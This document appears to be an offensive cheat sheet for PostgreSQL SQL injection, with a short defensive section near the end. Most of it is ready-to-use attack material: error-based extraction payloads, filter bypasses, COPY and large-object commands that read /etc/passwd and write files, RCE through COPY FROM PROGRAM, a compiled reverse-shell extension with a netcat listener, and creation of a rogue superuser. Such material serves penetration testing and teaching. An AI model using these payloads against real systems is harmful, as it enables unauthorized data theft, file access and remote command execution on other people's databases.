# Advanced SQL Injections Cheat Sheet

## PostgreSQL Database Interaction

### Basic Connection Command
```bash
psql -h <host> -U <username> <database>
```

**Explanation**: This command connects to a PostgreSQL database server. The `-h` flag specifies the hostname or IP address of the database server, `-U` specifies the username to authenticate with, and the final parameter is the database name. This is the primary interactive terminal for executing PostgreSQL commands and is essential for manual testing and exploitation.

---

## Java Archive Decompilation

### Fernflower Decompiler
```bash
mkdir <OutputDirectory>
java -jar Fernflower.jar <Application>.jar <OutputDirectory>
cd <OutputDirectory>
jar -xf <Application>.jar
```

**Explanation**: Fernflower is a powerful Java decompiler that converts compiled `.class` files back to readable Java source code. This is crucial for analyzing closed-source Java applications to find SQL injection vulnerabilities. The process involves:
1. Creating an output directory
2. Running Fernflower against the target JAR file
3. Extracting the decompiled contents to examine the source code

### JD-GUI Decompiler
```bash
jd-gui <Application>.jar
```

**Explanation**: JD-GUI is a graphical Java decompiler that provides a user-friendly interface for browsing decompiled source code. Unlike Fernflower's command-line approach, JD-GUI allows for quick navigation through packages, classes, and methods, making it easier to identify SQL query construction patterns visually.

---

## Regex Patterns for SQL Injection Detection

### Critical Patterns
```regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP
(WHERE|VALUES).*?'
(WHERE|VALUES).*?" +
.*sql.*"
jdbcTemplate
```

**Explanation**: These regex patterns help identify potential SQL injection vulnerabilities in source code:

- **`SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP`**: Matches SQL command keywords, indicating direct database operations
- **`(WHERE|VALUES).*?'`**: Finds WHERE or VALUES clauses followed by single quotes, suggesting string concatenation
- **`(WHERE|VALUES).*?" +`**: Identifies string concatenation operations in SQL queries (common in Java)
- **`.*sql.*"`**: Locates variables containing "sql" in their names
- **`jdbcTemplate`**: Finds Spring Framework's JDBC template usage, which can be vulnerable if used improperly

These patterns should be used with tools like `grep`, `ripgrep`, or IDE search functions to scan entire codebases efficiently.

---

## Live Debugging Java Applications

### JDWP Debug Mode
```bash
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar <Application>.jar
```

**Explanation**: This command enables Java Debug Wire Protocol (JDWP) for remote debugging. The parameters:
- `-Xdebug`: Enables debugging features
- `-Xrunjdwp`: Specifies JDWP implementation
- `transport=dt_socket`: Uses socket transport
- `address=8000`: Listens on port 8000
- `server=y`: Acts as debug server
- `suspend=y`: Suspends VM until debugger attaches

This is invaluable for dynamic analysis, allowing you to set breakpoints, inspect variables, and trace SQL query construction at runtime.

---

## PostgreSQL Logging Configuration

### Enabling Comprehensive Logging
**File**: `/etc/postgresql/13/main/postgresql.conf`

**Changes to make**:
```ini
logging_collector = on
log_statement = 'all'
log_directory = 'log'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
```

**Explanation**: These settings enable full SQL query logging for monitoring and debugging:

- `logging_collector = on`: Enables the logging collector process that captures log output
- `log_statement = 'all'`: Logs all SQL statements (including DDL, DML, and queries)
- `log_directory` and `log_filename`: Configure where logs are stored and their naming convention

After modifying, restart PostgreSQL with `sudo systemctl restart postgresql`. This is essential for understanding application behavior and identifying injection attempts.

---

## Common Character Bypass Techniques

### Whitespace Alternatives
- Use `/**/` instead of space

**Explanation**: When spaces are filtered, PostgreSQL treats `/**/` (multi-line comment) as valid whitespace. For example:
```sql
SELECT/**/username/**/FROM/**/users
```
This bypasses basic WAF rules that only check for literal spaces.

### String Literal Alternatives
- Use `$$string$$` instead of `'string'`

**Explanation**: PostgreSQL's dollar-quoted string constants (`$$text$$`) bypass single-quote filtering. Multiple dollar quotes can include tags: `$tag$text$tag$`. This is particularly useful when single quotes are escaped or blocked.

---

## Error-Based SQL Injection

### Version Extraction
```sql
' and 0=CAST((SELECT VERSION()) AS INT)--
```

**Explanation**: This technique forces a database error that contains the query result. PostgreSQL attempts to cast the version string to an integer, which fails and includes the string in the error message. The `--` comments out the rest of the original query.

### Table Name Extraction
```sql
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
```

**Explanation**: Extracts the first table name from `information_schema.tables`. The `LIMIT 1` ensures only one result is returned. Each subsequent injection can use `OFFSET` to retrieve additional tables.

### Multiple Table Names
```sql
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
```

**Explanation**: Uses `STRING_AGG()` to concatenate all table names into a single string separated by commas, reducing the number of required injections. This is more efficient than extracting tables one by one.

### XML-Based Data Exfiltration
```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
```

**Explanation**: Converts query results to XML format using `QUERY_TO_XML()`, then casts to text and attempts integer conversion to trigger error-based output. This can bypass some filters that block direct casting.

---

## Reading Files from the Database Server

### Using COPY Command
```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**Explanation**: The `COPY` command reads files directly into tables. This requires superuser privileges. The file path is relative to the database server filesystem, not the client. Each line becomes a row in the table.

**With Custom Delimiter**:
```sql
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
```

**Explanation**: Uses a custom delimiter (ASCII bell character) to handle files with irregular formatting. The `E'\x07'` is PostgreSQL's escape string syntax.

### Using Large Objects
```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
```

**Explanation**: Large objects (LOBs) are another method to read files:
1. `lo_import()` imports the file and returns an OID (object identifier)
2. `lo_get()` retrieves the entire object as bytea
3. Direct query on `pg_largeobject` table allows paginated reading for large files

**Hexadecimal Conversion**:
```bash
echo 726f6f743c... | xxd -r -p
```

**Explanation**: Converts hex-encoded file content back to binary format. Useful when dealing with binary files or when output needs to be decoded.

---

## Writing Files to the Database Server

### Using COPY Command
```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

**Explanation**: Reverse of file reading - creates a table, inserts data, then uses `COPY TO` to write to the filesystem. Requires write permissions on the target path.

### Using Large Objects
```bash
split -b 2048 /etc/passwd
xxd -ps -c 99999999999 xaa
```

**Explanation**: For large files, split into chunks and convert to hex:
1. `split -b 2048`: Splits file into 2KB chunks
2. `xxd -ps`: Converts to plain hex dump
3. `-c 99999999999`: Ensures entire chunk is on one line

**SQL Operations**:
```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74...','HEX'));
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
```

**Explanation**: 
1. `lo_create()`: Creates a new large object with specified OID
2. `INSERT`: Populates the object with hex-decoded data
3. `lo_export()`: Writes the object to filesystem
4. `lo_unlink()`: Cleans up the large object

---

## Command Execution (RCE)

### RCE via COPY
```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**Explanation**: The `COPY FROM PROGRAM` extension (PostgreSQL 9.3+) executes shell commands and captures their output. This is one of the most powerful features for post-exploitation. The command runs with the privileges of the PostgreSQL server process (often `postgres` user).

### RCE via Custom Extensions

**Compilation**:
```bash
sudo apt install postgresql-server-dev-13
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

**Explanation**: Custom C extensions can provide arbitrary code execution:
1. Install PostgreSQL development headers
2. Compile a shared library with reverse shell payload
3. The library exports a function callable from SQL

**Execution**:
```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);
```

**Explanation**: 
1. `CREATE FUNCTION`: Registers the compiled library as a SQL function
2. `LANGUAGE C STRICT`: Specifies it's a C function with strict argument checking
3. `SELECT rev_shell(...)`: Triggers the reverse shell connection

**Setup Listener**:
```bash
nc -nvlp 443
```

**Explanation**: Netcat listens for the incoming reverse shell connection on port 443 (often allowed through firewalls).

---

## Defense Against SQL Injection

### Use Parameterized Queries!

**Explanation**: This is the **only** reliable defense against SQL injection. Parameterized queries (prepared statements) separate SQL logic from data, ensuring user input is never interpreted as SQL code.

**Example (Java)**:
```java
// Vulnerable
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";

// Secure
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInput);
```

**Key Principles**:
- Never concatenate user input into SQL strings
- Always use prepared statements with bound parameters
- Input validation is a secondary defense, not a replacement
- Principle of least privilege: database accounts should have minimal permissions
- Disable dangerous functions like `pg_read_file()`, `pg_execute_server_program()` in production

---

## Additional PostgreSQL-Specific Techniques

### Information Schema Queries
```sql
-- List all databases
SELECT datname FROM pg_database;

-- List all users
SELECT usename FROM pg_user;

-- Check current user privileges
SELECT current_user, session_user;

-- List all tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

### Privilege Escalation
```sql
-- Check if superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- Try to create a new superuser (requires superuser privileges)
CREATE USER hacker WITH SUPERUSER PASSWORD 'hacker';
```

### Network Reconnaissance
```sql
-- Read PostgreSQL configuration files
SELECT pg_read_file('postgresql.conf');

-- List network settings
SELECT name, setting FROM pg_settings WHERE name LIKE '%address%' OR name LIKE '%port%';
```

---

## Detection and Prevention Checklist

### For Developers
- ✅ Use ORM frameworks with proper query builders
- ✅ Implement input validation (whitelist approach)
- ✅ Escape all user input before database operations
- ✅ Use least-privilege database accounts
- ✅ Regular security code reviews focusing on SQL construction

### For Database Administrators
- ✅ Enable detailed logging in development/staging
- ✅ Restrict file system access (no `COPY TO/FROM PROGRAM`)
- ✅ Disable or restrict `pg_file_settings`, `pg_read_file`
- ✅ Use `pg_hba.conf` to enforce strong authentication
- ✅ Regularly audit database permissions
- ✅ Consider using `pgaudit` extension for detailed audit trails

### For Security Teams
- ✅ Deploy Web Application Firewalls (WAF) with SQLi rules
- ✅ Monitor for SQL error messages in application responses
- ✅ Implement runtime application self-protection (RASP)
- ✅ Regular penetration testing focusing on injection vectors
- ✅ Use database activity monitoring (DAM) solutions

---
